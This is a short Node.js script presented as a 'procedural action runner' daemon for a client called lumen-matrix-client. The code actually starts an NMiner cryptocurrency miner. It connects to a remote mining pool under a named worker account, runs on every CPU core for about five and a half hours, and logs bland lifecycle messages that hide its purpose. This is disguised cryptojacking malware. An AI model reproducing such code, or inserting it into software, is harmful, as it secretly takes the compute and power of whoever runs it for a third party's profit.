// Procedural action runner for lumen-matrix-client
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./core/config");

(async () => {
    const instanceToken = "3758a3";
    console.log(`[lifecycle] Daemon ${config.appName || "lumen-matrix-client"} active [tag: ${instanceToken}]`);

    const service = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.lumen-matrix-client",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    const tick = () => { setTimeout(tick, 51000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (327m) reached, exiting cleanly.");
        process.exit(0);
    }, 327 * 60 * 1000);

    process.once("SIGTERM", () => {
        
        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
        process.exit(0);
    });

    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
})().catch(console.error);
